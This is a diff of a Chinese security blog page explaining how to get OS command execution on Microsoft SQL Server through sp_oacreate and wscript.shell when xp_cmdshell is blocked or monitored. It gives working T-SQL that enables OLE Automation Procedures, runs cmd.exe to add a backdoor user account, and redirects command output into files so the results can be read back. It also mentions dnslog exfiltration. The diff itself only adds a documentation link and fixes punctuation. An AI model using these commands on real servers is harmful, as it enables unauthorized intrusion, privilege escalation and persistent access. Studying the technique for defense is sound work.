@@ -6,21 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介12参考语法:sp_">
+    <meta name="description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介官方手册：https">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用sp_oacreate实现命令交互">
 <meta property="og:url" content="http://yoursite.com/2019/08/10/mssql/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介12参考语法:sp_">
+<meta property="og:description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介官方手册：https">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4eb6906d67ff3e50fb366e">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4eb98132f2ca4a5a6af98c">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4ebf82a3725944a2ad7bcd">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4ec0e190144e0cfe53b3b2">
-<meta property="og:updated_time" content="2019-08-10T13:29:53.000Z">
+<meta property="og:updated_time" content="2019-08-10T13:44:45.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用sp_oacreate实现命令交互">
-<meta name="twitter:description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介12参考语法:sp_">
+<meta name="twitter:description" content="0x00 前言通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。 如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。 0x01 sp_oacreate简介官方手册：https">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4eb6906d67ff3e50fb366e">
     
     
@@ -143,16 +143,17 @@
   <div class="content" itemprop="articleBody">
     <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>通常情况下，当遇到mssql数据库，我们通常会使用xp_cmdshell 存储过程来提权，获取系统权限，默认情况下，SQL Server会通过关闭组件来安全配置服务器。</p>
 <p>如果xp_cmdshell组件被管理员删除或被杀毒软件监控，还是可以继续使用sp_oacreate，本文将讲述如何通过调用sp_oacreate实现命令交互。</p>
-<h1 id="0x01-sp-oacreate简介"><a href="#0x01-sp-oacreate简介" class="headerlink" title="0x01 sp_oacreate简介"></a>0x01 sp_oacreate简介</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考语法:</span><br><span class="line">sp_OACreate &#123; progid | clsid &#125; , objecttoken OUTPUT [ , context ]</span><br></pre></td></tr></table></figure>
+<h1 id="0x01-sp-oacreate简介"><a href="#0x01-sp-oacreate简介" class="headerlink" title="0x01 sp_oacreate简介"></a>0x01 sp_oacreate简介</h1><p>官方手册：<a href="https://docs.microsoft.com/zh-tw/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-2017</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法:</span><br><span class="line">sp_OACreate &#123; progid | clsid &#125; , objecttoken OUTPUT [ , context ]</span><br></pre></td></tr></table></figure>
 <p>progid是要创建的OLE对象的编程标识符（ProgID）。此字符串描述OLE对象的类，其格式为：OLEComponent,它是OLE自动化服务器的组件名称，Object是OLE对象的名称。<br>OUTPUT是返回的对象标记，必须是数据类型为int的局部变量。此对象标记标识创建的OLE对象，并用于调用其他OLE自动化存储过程。</p>
-<p>使用dba权限,启用OLE Automation Procedures配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sp_configure&apos;show advanced options&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE; </span><br><span class="line">GO  </span><br><span class="line">sp_configure&apos;Ole Automation Procedures&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE; </span><br><span class="line">GO  </span><br><span class="line">sp_configure&apos;show advanced options&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
+<p>使用dba权限，启用OLE Automation Procedures配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sp_configure&apos;show advanced options&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE; </span><br><span class="line">GO  </span><br><span class="line">sp_configure&apos;Ole Automation Procedures&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE; </span><br><span class="line">GO  </span><br><span class="line">sp_configure&apos;show advanced options&apos;,1  </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d4eb6906d67ff3e50fb366e" alt=""></p>
 <h1 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h1><p>实例:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &apos;wscript.shell&apos;, @shell output</span><br><span class="line">exec sp_oamethod @shell, &apos;run&apos; , null, &apos;c:\windows\system32\cmd.exe \c &quot;net user c1y2m3 pinohd123. /add&quot; &apos;</span><br></pre></td></tr></table></figure>
-<p>其中sp_OACreate 创建 OLE 对象 wscript.shell,而sp_OAMethod 调用 OLE 对象的方法,如果未使用特定参数，则需要将NULL值作为占位符传递。</p>
+<p>其中sp_OACreate 创建 OLE 对象 wscript.shell，而sp_OAMethod 调用 OLE 对象的方法，如果未使用特定参数，则需要将NULL值作为占位符传递。</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d4eb98132f2ca4a5a6af98c" alt=""></p>
-<p>通过调用<code>sp_oacreate</code>能够获得一个数字返回值,0（成功）或非零数字（失败），它是OLE自动化对象返回的HRESULT的整数值。</p>
-<h1 id="0x03-完整利用流程"><a href="#0x03-完整利用流程" class="headerlink" title="0x03 完整利用流程"></a>0x03 完整利用流程</h1><p>同时这种方式是无法回显,当然,我们也可以使用dnslog等传输协议进行获取系统对应的信息,经过探索,下面我使用另外一种方法实现命令交互。</p>
+<p>通过调用<code>sp_oacreate</code>能够获得一个数字返回值，0（成功）或非零数字（失败），它是OLE自动化对象返回的HRESULT的整数值。</p>
+<h1 id="0x03-完整利用流程"><a href="#0x03-完整利用流程" class="headerlink" title="0x03 完整利用流程"></a>0x03 完整利用流程</h1><p>同时这种方式是无法回显,当然,我们也可以使用dnslog等传输协议进行获取系统对应的信息，经过探索，下面我使用另外一种方法实现命令交互。</p>
 <p>1、将结果重定向到文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &apos;wscript.shell&apos;,@shell output exec sp_oamethod @shell,&apos;run&apos;,null,&apos;c:\windows\system32\cmd.exe /c whoami &gt;C:\whoami.txt&apos;</span><br></pre></td></tr></table></figure>
 <p>2、创建数据库表,插入绝对路径文件。</p>
